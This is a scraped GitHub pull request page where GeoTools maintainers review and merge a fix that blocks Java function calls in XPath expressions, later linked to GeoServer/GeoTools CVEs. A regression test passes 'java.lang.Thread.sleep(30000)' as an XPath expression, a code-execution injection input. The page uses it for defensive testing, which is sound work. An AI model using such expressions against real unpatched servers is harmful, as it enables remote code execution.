=== Content from github.com_4eef730d_20250111_082232.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgeotools%2Fgeotools%2Fpull%2F4797)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgeotools%2Fgeotools%2Fpull%2F4797)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=geotools%2Fgeotools)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[geotools](/geotools)
/
**[geotools](/geotools/geotools)**
Public

* [Notifications](/login?return_to=%2Fgeotools%2Fgeotools) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2Fgeotools%2Fgeotools)
* [Star
   1.7k](/login?return_to=%2Fgeotools%2Fgeotools)

* [Code](/geotools/geotools)
* [Pull requests
  3](/geotools/geotools/pulls)
* [Actions](/geotools/geotools/actions)
* [Projects
  0](/geotools/geotools/projects)
* [Wiki](/geotools/geotools/wiki)
* [Security](/geotools/geotools/security)
* [Insights](/geotools/geotools/pulse)

Additional navigation options

* [Code](/geotools/geotools)
* [Pull requests](/geotools/geotools/pulls)
* [Actions](/geotools/geotools/actions)
* [Projects](/geotools/geotools/projects)
* [Wiki](/geotools/geotools/wiki)
* [Security](/geotools/geotools/security)
* [Insights](/geotools/geotools/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fgeotools%2Fgeotools%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fgeotools%2Fgeotools%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# [GEOT-7587] Improve handling of XPath expressions #4797

 Merged

[jodygarnett](/jodygarnett)
merged 1 commit into
[geotools:main](/geotools/geotools/tree/main "geotools/geotools:main")
from
[sikeoka:GEOT-7587](/sikeoka/geotools/tree/GEOT-7587 "sikeoka/geotools:GEOT-7587")

Jun 5, 2024

 Merged

# [[GEOT-7587] Improve handling of XPath expressions](#top) #4797

[jodygarnett](/jodygarnett)
merged 1 commit into
[geotools:main](/geotools/geotools/tree/main "geotools/geotools:main")
from
[sikeoka:GEOT-7587](/sikeoka/geotools/tree/GEOT-7587 "sikeoka/geotools:GEOT-7587")

Jun 5, 2024

[Conversation
16](/geotools/geotools/pull/4797)
[Commits
1](/geotools/geotools/pull/4797/commits)
[Checks
26](/geotools/geotools/pull/4797/checks)
[Files changed](/geotools/geotools/pull/4797/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![sikeoka](https://avatars.githubusercontent.com/u/11542093?s=60&v=4)](/sikeoka)

Copy link

Contributor

### @sikeoka **[sikeoka](/sikeoka)** commented [Jun 4, 2024](#issue-2333797410) ‚Ä¢ edited Loading

[![GEOT-7587](https://camo.githubusercontent.com/f85ee48b472a4ad18be554443ceac9d5d2cdaeb24d8dc91d0463b534e952b11d/68747470733a2f2f62616467656e2e6e65742f62616467652f4a4952412f47454f542d373538372f303035324343)](https://osgeo-org.atlassian.net/browse/GEOT-7587) [![Powered by Pull Request Badge](https://user-images.githubusercontent.com/1393946/111216524-d2bb8e00-85d4-11eb-821b-ed4c00989c02.png)](https://pullrequestbadge.com/?utm_medium=github&utm_source=geotools&utm_campaign=badge_info)

This PR refactors all jxpath initialization into a new utility method that disables calling functions from XPath expressions and fixes an incomplete class check that allowed complex feature code to be used on simple features. Some unnecessary dependency exclusions were also removed to clean up the pom.xml (commons-jxpath has no transitive dependencies).

# Checklist

* I have read the [contribution guidelines](https://github.com/geotools/geotools/blob/main/CONTRIBUTING.md).
* I have sent a [Contribution Licence Agreement](https://docs.geotools.org/latest/developer/procedures/contribution_license.html) (not required for small changes, e.g., fixing typos in documentation).
* First PR targets the `main` branch (backports managed later; ignore for branch specific issues).
* Avoid [Java 9+ split packages](http://tutorials.jenkov.com/java/modules.html#split-packages-not-allowed).
* All the build checks are green ([see automated QA checks](https://docs.geotools.org/latest/developer/conventions/code/qa.html)).

For core and extension modules:

* New unit tests have been added covering the changes.
* [Documentation](https://github.com/geotools/geotools/tree/main/docs) has been updated (if change is visible to end users).
* There is an issue in [GeoTools Jira](https://osgeo-org.atlassian.net/projects/GEOT) (except for changes not visible to end users).
* Commit message(s) must be in the form `[GEOT-XYZW] Title of the Jira ticket`.
* Bug fixes and small new features are presented as a single commit.
* The commit targets a single objective (if multiple focuses cannot be avoided, each one is in its own commit, and has a separate ticket describing it).

Sorry, something went wrong.

All reactions

 [![@sikeoka](https://avatars.githubusercontent.com/u/11542093?s=40&v=4)](/sikeoka)
[sikeoka](/sikeoka)
[force-pushed](/geotools/geotools/compare/582ac1723e66393cf7be63a9b2955427e877dc8b..fc74f9039d05753857788716c248416b005d13e5)
the
GEOT-7587

branch
from
[`582ac17`](/geotools/geotools/commit/582ac1723e66393cf7be63a9b2955427e877dc8b) to
[`fc74f90`](/geotools/geotools/commit/fc74f9039d05753857788716c248416b005d13e5)  [Compare](/geotools/geotools/compare/582ac1723e66393cf7be63a9b2955427e877dc8b..fc74f9039d05753857788716c248416b005d13e5)
[June 4, 2024 15:24](#event-13038306967)

[![davidblasby](https://avatars.githubusercontent.com/u/48937730?s=60&v=4)](/davidblasby)

**[davidblasby](/davidblasby)**
reviewed
[Jun 4, 2024](#pullrequestreview-2096872818)

 [View reviewed changes](/geotools/geotools/pull/4797/files)

[modules/extension/xsd/xsd-core/src/test/java/org/geotools/xsd/StreamingParserTest.java](/geotools/geotools/pull/4797/files#diff-35b25d78737fbba349f6122e6ed3373ae5c731a563172be688c4ec24e1a296b6)
Outdated

Show resolved

Hide resolved

[![davidblasby](https://avatars.githubusercontent.com/u/48937730?s=60&v=4)](/davidblasby)

**[davidblasby](/davidblasby)**
approved these changes
[Jun 4, 2024](#pullrequestreview-2096875009)

 [View reviewed changes](/geotools/geotools/pull/4797/files)

Copy link

Contributor

### @davidblasby **[davidblasby](/davidblasby)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Looks like a great addition. I don't really know the code, so I cannot say too much - sorry.

I think increasing the 5 second to something like 20 seconds would make it very unlikely to have a busy-machine problem. However, this is just a guess - its okay the way it is.

Sorry, something went wrong.

All reactions

[...ension/complex/src/test/java/org/geotools/filter/expression/FeaturePropertyAccessorTest.java](/geotools/geotools/pull/4797/files#diff-e7291403b36ac2cf7efe976006490c89af1c3fde587fc34023b63feae8ba4817)

Show resolved

Hide resolved

[![@sikeoka](https://avatars.githubusercontent.com/u/11542093?s=40&v=4)](/sikeoka)

`[[GEOT-7587] Improve handling of XPath expressions](/geotools/geotools/pull/4797/commits/e53e5170ba71521728875a436c80616cfb03c1e8 "[GEOT-7587] Improve handling of XPath expressions")`

`[e53e517](/geotools/geotools/pull/4797/commits/e53e5170ba71521728875a436c80616cfb03c1e8)`

 [![@sikeoka](https://avatars.githubusercontent.com/u/11542093?s=40&v=4)](/sikeoka)
[sikeoka](/sikeoka)
[force-pushed](/geotools/geotools/compare/fc74f9039d05753857788716c248416b005d13e5..e53e5170ba71521728875a436c80616cfb03c1e8)
the
GEOT-7587

branch
from
[`fc74f90`](/geotools/geotools/commit/fc74f9039d05753857788716c248416b005d13e5) to
[`e53e517`](/geotools/geotools/commit/e53e5170ba71521728875a436c80616cfb03c1e8)  [Compare](/geotools/geotools/compare/fc74f9039d05753857788716c248416b005d13e5..e53e5170ba71521728875a436c80616cfb03c1e8)
[June 4, 2024 17:20](#event-13039675775)

[![jodygarnett](https://avatars.githubusercontent.com/u/629681?s=60&v=4)](/jodygarnett)

**[jodygarnett](/jodygarnett)**
approved these changes
[Jun 5, 2024](#pullrequestreview-2097658624)

 [View reviewed changes](/geotools/geotools/pull/4797/files/e53e5170ba71521728875a436c80616cfb03c1e8)

Copy link

Member

### @jodygarnett **[jodygarnett](/jodygarnett)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I am approving, with some minor feedback (test case threadsafety, and method name choice). I do not feel comfortable about "request changes" as that would block PR.

[@sikeoka](https://github.com/sikeoka) I will wait for your response/consideration before merge and backport.

Sorry, something went wrong.

All reactions

[modules/extension/xsd/xsd-core/src/test/java/org/geotools/xsd/StreamingParserTest.java](/geotools/geotools/pull/4797/files/e53e5170ba71521728875a436c80616cfb03c1e8#diff-35b25d78737fbba349f6122e6ed3373ae5c731a563172be688c4ec24e1a296b6)

|  |  | public void testParseWithJavaMethod() throws Exception { |
| --- | --- | --- |
|  |  | ByteArrayInputStream in = new ByteArrayInputStream("<mails></mails>".getBytes()); |
|  |  | StreamingParser parser = |
|  |  | new StreamingParser(new MLConfiguration(), in, "java.lang.Thread.sleep(30000)"); |

Copy link

Member

### @jodygarnett **[jodygarnett](/jodygarnett)** [Jun 5, 2024](#discussion_r1626792478)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I am a bit confused as to choosing a time based example? Why not `java.lang.Math.abs(-1.0)` - and test. to see that 1.0 is returned. This would be a test that is not sensitive to build server speed?

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @sikeoka **[sikeoka](/sikeoka)** [Jun 5, 2024](#discussion_r1627946796) ‚Ä¢ edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

This is a type of issue that is commonly referred to as `blind`. Just because something is being done doesn't mean that the result is actually sent anywhere so I needed some kind of side effect that I could check for. I originally tested this using `System.exit` but that isn't as JUnit or Maven friendly.

Sorry, something went wrong.

 üòÑ
1
 jodygarnett reacted with laugh emoji

All reactions

* üòÑ
  1 reaction

Copy link

Member

### @jodygarnett **[jodygarnett](/jodygarnett)** [Jun 5, 2024](#discussion_r1628082131)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Okay that makes sense, thanks for explaining.

Sorry, something went wrong.

All reactions

[...mplex/src/main/java/org/geotools/data/complex/expression/FeaturePropertyAccessorFactory.java](/geotools/geotools/pull/4797/files/e53e5170ba71521728875a436c80616cfb03c1e8#diff-a4ed841fe4f8d1ef6262ee61a6b0e8ae4a4d27b10d5d4eb2ec7f4d3c3b99d775)

|  |  | } |
| --- | --- | --- |
|  |  |  |
|  |  | JXPathContext context = |
|  |  | JXPathUtils.newSafeContext(object, false, this.namespaces, true); |

Copy link

Member

### @jodygarnett **[jodygarnett](/jodygarnett)** [Jun 5, 2024](#discussion_r1626794060)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Minor feedback, `newSafeContext` may promise too much, if attribute security is used for something like GeoFence security plugin this would not know enough to prevent specific data traversals.

A name like `newDataContext` would be more clear this is about providing access to data only, not functions.

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @sikeoka **[sikeoka](/sikeoka)** [Jun 5, 2024](#discussion_r1627956415) ‚Ä¢ edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I named this based on two existing cases for similar types of issues although `getSafeContext` would be a more consistent name than `newSafeContext`:

org.geoserver.template.TemplateUtils.getSafeConfiguration()

org.geotools.ysld.YamlUtil.getSafeYaml()

Sorry, something went wrong.

 üëç
1
 jodygarnett reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

[modules/extension/xsd/xsd-core/src/main/java/org/geotools/xsd/impl/jxpath/JXPathUtils.java](/geotools/geotools/pull/4797/files/e53e5170ba71521728875a436c80616cfb03c1e8#diff-6e0fd86b25d51c6240ad166fd0ac1d8d4e3afd3c5612841d07c2b9a2c4914cf2)

|  |  | \* @param lenient whether the context is in lenient mode |
| --- | --- | --- |
|  |  | \* @return the context |
|  |  | \*/ |
|  |  | public static JXPathContext newSafeContext(Object contextBean, boolean lenient) { |

Copy link

Member

### @jodygarnett **[jodygarnett](/jodygarnett)** [Jun 5, 2024](#discussion_r1626798918)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Thanks for the clear javadocs I appreciate it.

Minor feedback: Consider `newDataContext` to accurately describe the restriction of no methods. In a more complicated security model such as GeoFence data traversal may be considered "unsafe" leading to this method name being misleading / incomplete.

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @sikeoka **[sikeoka](/sikeoka)** [Jun 5, 2024](#discussion_r1627959633)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I really don't understand this comment since GeoFence has no dependence on gt-complex or commons-jxpath.

Sorry, something went wrong.

All reactions

Copy link

Member

### @jodygarnett **[jodygarnett](/jodygarnett)** [Jun 5, 2024](#discussion_r1628081109)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I was trying to indicate that specific attributes may be restricted (using a geofence as an example of a plugin that offers this kind of functionality).

So "safe" indicates no functions, but it would not be safe from using xpath to traverse data to access a restricted columns.

As indicated this was minor feedback only.

Sorry, something went wrong.

All reactions

[![@jodygarnett](https://avatars.githubusercontent.com/u/629681?s=40&u=882f3d31e5d450f43ca9f54f468dcd79c4305895&v=4)](/jodygarnett)
[jodygarnett](/jodygarnett)
added
[backport 30.x](/geotools/geotools/labels/backport%2030.x)
Backport bot will backport to 30.x on merge
[backport 31.x](/geotools/geotools/labels/backport%2031.x)
Automatic backport to 31.x branch
labels
[Jun 5, 2024](#event-13054295136)

 Hide details
View details

[![@jodygarnett](https://avatars.githubusercontent.com/u/629681?s=40&u=882f3d31e5d450f43ca9f54f468dcd79c4305895&v=4)](/jodygarnett)
[jodygarnett](/jodygarnett)
merged commit [`f0c9961`](/geotools/geotools/commit/f0c9961dc4d40c5acfce2169fab92805738de5ea)
into
geotools:main

[Jun 5, 2024](https://github.com/geotools/geotools/pull/4797#event-13054297928)
23 checks passed

This was referenced Jun 5, 2024

[[Backport 30.x] [GEOT-7587] Improve handling of XPath expressions
#4800](/geotools/geotools/pull/4800)
 Merged

[[Backport 31.x] [GEOT-7587] Improve handling of XPath expressions
#4801](/geotools/geotools/pull/4801)
 Merged

[![@aaime](https://avatars.githubusercontent.com/u/325433?s=40&u=07d7270f523f3613ee5934affa295ba5ade1e0f6&v=4)](/aaime)
[aaime](/aaime)
added
the
[backport 29.x](/geotools/geotools/labels/backport%2029.x)
label
[Jun 5, 2024](#event-13055052455)

[![@aaime](https://avatars.githubusercontent.com/u/325433?s=80&u=07d7270f523f3613ee5934affa295ba5ade1e0f6&v=4)](/aaime)

Copy link

Member

### **[aaime](/aaime)** commented [Jun 5, 2024](#issuecomment-2150598038)

| The backport to `29.x` failed:  ``` The process '/usr/bin/git' failed with exit code 1  ```  stderr ``` error: could not apply e53e5170ba... [GEOT-7587] Improve handling of XPath expressions hint: After resolving the conflicts, mark them with hint: "git add/rm <pathspec>", then run hint: "git cherry-pick --continue". hint: You can instead skip this commit with "git cherry-pick --skip". hint: To abort and get back to the state before "git cherry-pick", hint: run "git cherry-pick --abort". hint: Disable this message with "git config advice.mergeConflict false"   ```   stdout ``` Auto-merging modules/extension/complex/src/main/java/org/geotools/data/complex/expression/FeaturePropertyAccessorFactory.java CONFLICT (content): Merge conflict in modules/extension/complex/src/main/java/org/geotools/data/complex/expression/FeaturePropertyAccessorFactory.java Auto-merging modules/extension/complex/src/main/java/org/geotools/data/complex/expression/MapPropertyAccessorFactory.java CONFLICT (content): Merge conflict in modules/extension/complex/src/main/java/org/geotools/data/complex/expression/MapPropertyAccessorFactory.java Auto-merging modules/extension/complex/src/test/java/org/geotools/filter/expression/FeaturePropertyAccessorTest.java Auto-merging modules/extension/xsd/xsd-core/pom.xml CONFLICT (content): Merge conflict in modules/extension/xsd/xsd-core/pom.xml   ```   To backport manually, run these commands in your terminal:  ``` # Fetch latest updates from GitHub git fetch # Create a new working tree git worktree add .worktrees/backport-29.x 29.x # Navigate to the new working tree cd .worktrees/backport-29.x # Create a new branch git switch --create backport-4797-to-29.x # Cherry-pick the merged commit of this pull request and resolve the conflicts git cherry-pick e53e5170ba71521728875a436c80616cfb03c1e8 # Push it to GitHub git push --set-upstream origin backport-4797-to-29.x # Go back to the original working tree cd ../.. # Delete the working tree git worktree remove .worktrees/backport-29.x ```  Then, create a pull request where the `base` branch is `29.x` and the `compare`/`head` branch is `backport-4797-to-29.x`. |
| --- |

All reactions

Sorry, something went wrong.

[![@aaime](https://avatars.githubusercontent.com/u/325433?s=40&u=07d7270f523f3613ee5934affa295ba5ade1e0f6&v=4)](/aaime)
[aaime](/aaime)
added
the
[failed backport](/geotools/geotools/labels/failed%20backport)
label
[Jun 5, 2024](#event-13055057875)

[![@jodygarnett](https://avatars.githubusercontent.com/u/629681?s=40&u=882f3d31e5d450f43ca9f54f468dcd79c4305895&v=4)](/jodygarnett)
[jodygarnett](/jodygarnett)
removed
[failed backport](/geotools/geotools/labels/failed%20backport)
[backport 29.x](/geotools/geotools/labels/backport%2029.x)
labels
[Jun 6, 2024](#event-13058784777)

[![@foyaga](https://avatars.githubusercontent.com/u/62537001?s=40&v=4)](/foyaga)
[foyaga](/foyaga)
mentioned this pull request
[Jul 2, 2024](#ref-issue-2385743357)

[GeoServer property Ë°®ËææÂºèÊ≥®ÂÖ•‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÔºàCVE-2024-36401Ôºâ
foyaga/blog-timeline#294](/foyaga/blog-timeline/issues/294)

Open

[![@mirandadam](https://avatars.githubusercontent.com/u/3647225?s=40&v=4)](/mirandadam)
[mirandadam](/mirandadam)
mentioned this pull request
[Jul 3, 2024](#ref-issue-2385631793)

[Geoserver build for patch CVE-2024-36401
GeoNode/geonode-docker#44](/GeoNode/geonode-docker/issues/44)

Closed

 [![@sikeoka](https://avatars.githubusercontent.com/u/11542093?s=40&v=4)](/sikeoka)
[sikeoka](/sikeoka)
deleted the
GEOT-7587

branch
[July 15, 2024 20:09](#event-13510525358)

[![@javacoderpyl](https://avatars.githubusercontent.com/u/39752479?s=80&v=4)](/javacoderpyl)

Copy link

### **[javacoderpyl](/javacoderpyl)** commented [Aug 8, 2024](#issuecomment-2275155113)

| Hi, bro, since the versions 30.4, 31.2, and 29.6 of GeoTools that fix the vulnerability CVE-2024-36404 are all compiled jar files based on JDK 11, could you release a version that fixes this vulnerability but is compiled with JDK 8, such as version 28.x? |
| --- |

All reactions

Sorry, something went wrong.

[![@jodygarnett](https://avatars.githubusercontent.com/u/629681?s=80&u=882f3d31e5d450f43ca9f54f468dcd79c4305895&v=4)](/jodygarnett)

Copy link

Member

### **[jodygarnett](/jodygarnett)** commented [Aug 8, 2024](#issuecomment-2275897504)

| No one has volunteered to do that. We have a public release procedure if you wish to volunteer.  Even if you back port this fix, there are other vulnerabilities in older versions so why bother? |
| --- |

All reactions

Sorry, something went wrong.

[![@javacoderpyl](https://avatars.githubusercontent.com/u/39752479?s=80&v=4)](/javacoderpyl)

Copy link

### **[javacoderpyl](/javacoderpyl)** commented [Aug 8, 2024](#issuecomment-2275954126)

| No one has volunteered to do that. We have a public release procedure if you wish to volunteer.  Even if you back port this fix, there are other vulnerabilities in older versions so why bother?  Because our projects are based on Jdk8, the version of jdk11 cannot be run in our project. If I can study the open course and release a jdk 8 version of geotools that solves this vulnerability, how should I get this course? |
| --- |

All reactions

Sorry, something went wrong.

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fgeotools%2Fgeotools%2Fpull%2F4797)

Reviewers

[![@jodygarnett](https://avatars.githubusercontent.com/u/629681?s=40&v=4)](/jodygarnett) [jodygarnett](/jodygarnett)

jodygarnett approved these changes

[![@davidblasby](https://avatars.githubusercontent.com/u/48937730?s=40&v=4)](/davidblasby) [davidblasby](/davidblasby)

davidblasby approved these changes

Assignees

No one assigned

Labels

[backport 30.x](/geotools/geotools/labels/backport%2030.x)
Backport bot will backport to 30.x on merge
[backport 31.x](/geotools/geotools/labels/backport%2031.x)
Automatic backport to 31.x branch

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

5 participants

[![@sikeoka](https://avatars.githubusercontent.com/u/11542093?s=52&v=4)](/sikeoka) [![@aaime](https://avatars.githubusercontent.com/u/325433?s=52&v=4)](/aaime) [![@javacoderpyl](https://avatars.githubusercontent.com/u/39752479?s=52&v=4)](/javacoderpyl) [![@jodygarnett](https://avatars.githubusercontent.com/u/629681?s=52&v=4)](/jodygarnett) [![@davidblasby](https://avatars.githubusercontent.com/u/48937730?s=52&v=4)](/davidblasby)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_b915bb48_20250111_082229.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FWarxim%2FCVE-2022-41852%3Ftab%3Dreadme-ov-file)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FWarxim%2FCVE-2022-41852%3Ftab%3Dreadme-ov-file)

